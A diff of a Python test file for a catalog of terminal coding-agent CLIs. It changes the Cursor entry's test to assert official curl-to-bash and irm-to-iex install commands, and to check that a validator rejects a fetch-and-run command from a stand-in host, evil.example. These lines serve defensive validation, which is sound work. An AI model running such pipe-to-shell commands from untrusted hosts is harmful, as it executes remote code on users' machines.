@@ -12,7 +12,7 @@ from src.adapters.terminal import (
     PosixPtyHostConnector,
     load_repo_catalog,
 )
-from src.adapters.terminal.cli_catalog import MCP_CONFIG_FORMATS
+from src.adapters.terminal.cli_catalog import MCP_CONFIG_FORMATS, CatalogValidationError, validate_install_command
 from src.adapters.terminal.cli_install import build_install_command
 from src.adapters.terminal.mcp_injection import McpInjectionError, _render_config, default_agy_config_path
 from src.app.api_bridge import ApiBridge
@@ -161,12 +161,19 @@ def test_codex_resume_not_verified_until_measured() -> None:
     assert "WP-5b" in codex.resume["note"]
 
 
-def test_cursor_is_cataloged_without_script_install_or_mcp_injection() -> None:
+def test_cursor_is_cataloged_with_official_install_and_no_mcp_injection() -> None:
     cat = load_repo_catalog()
     spec = cat.profiles["cursor"]
     assert spec.binary_names == ("cursor-agent",)
-    # Sin metodo de instalacion: anadir un host de descarga a la lista de confianza es una decision aparte.
-    assert all(not options for options in spec.install.values())
+    commands = {platform: [opt.command for opt in options] for platform, options in spec.install.items()}
+    assert commands["linux"] == ["curl -fsSL https://cursor.com/install | bash"]
+    assert commands["darwin"] == ["curl -fsSL https://cursor.com/install | bash"]
+    assert commands["win32"] == ["irm https://cursor.com/install?win32=true | iex"]
+    # La consulta solo se admite en PowerShell y el host debe seguir siendo de confianza.
+    with pytest.raises(CatalogValidationError):
+        validate_install_command("curl_sh", "curl -fsSL https://cursor.com/install?win32=true | bash")
+    with pytest.raises(CatalogValidationError):
+        validate_install_command("powershell_irm", "irm https://evil.example/install?win32=true | iex")
     # No se inyecta MCP ni se habilita ninguna capacidad sin medirla.
     assert spec.mcp.get("method") == "none"
     for capability in ("activity", "delivery", "role_launch", "session"):
